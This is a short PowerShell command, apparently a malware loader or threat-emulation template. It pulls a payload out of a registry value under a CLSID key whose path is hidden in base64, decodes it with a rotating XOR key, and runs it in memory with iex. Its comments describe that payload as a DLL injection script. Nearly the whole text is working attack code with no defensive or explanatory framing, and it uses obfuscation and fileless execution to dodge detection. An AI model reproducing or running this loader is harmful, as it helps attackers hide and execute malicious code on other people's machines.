powershell -c """&{

$rn1=[System.Text.Encoding]::UTF8;

# gets the DLL injection script from property <last_4_chars_of_GUID_0> in key 
# hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgId
$rn2=Get-ItemProperty -Path($rn1.GetString([Convert]::FromBase64String('aGsobG18Y3UpOlxzb2Z0d2FyZVxjbGFzc2VzXENMU0lEXDxyYW5kb21fR1VJRF8wPlxQcm9nSWQ='))) -n 'f21a'|Select-Object -ExpandProperty 'f21a';
$rn3=4; # encode/decode key, ingeger 0-254

# decodes and invokes the DLL injection script
# Rotating XOR key that starts at $rn3 and increments by 4 every byte
iex($rn1.GetString($(for($rn4=0; $rn4 -lt $rn2.Length; $rn4++) {
	if($rn3 -ge 250){
		$rn3=0
	}
	$rn2[$rn4] -bxor $rn3;
	$rn3+=4
})))

}
"""